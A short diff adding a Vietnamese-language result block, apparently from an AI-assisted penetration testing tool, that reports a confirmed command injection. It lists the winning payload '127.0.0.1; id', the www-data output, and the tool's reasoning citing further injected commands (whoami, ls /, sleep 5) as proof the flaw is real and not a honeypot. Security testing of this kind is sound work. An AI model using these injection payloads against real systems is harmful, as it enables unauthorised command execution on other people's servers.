@@ -1,0 +1,5 @@
+Command Injection — AI Self-Validation hoàn tất.
+      - Payload tốt nhất   : 127.0.0.1; id
+      - Mục đích           : semicolon injection
+      - Output trích xuất  : uid=33(www-data) gid=33(www-data) groups=33(www-data)
+      - AI Reasoning       : Dựa trên các kết quả payload thực thi, đặc biệt là lệnh '127.0.0.1; whoami' trả về 'www-data', lệnh '127.0.0.1; ls /' liệt kê các thư mục và file hệ thống, và lệnh '127.0.0.1; sleep 5; id' gây delay và trả về '[SYSTEM_TIMEOUT: Phản hồi > 5s. Lệnh sleep đã thực thi thành công!]', chứng tỏ lỗ hổng thực sự tồn tại và không phải là honeypot.
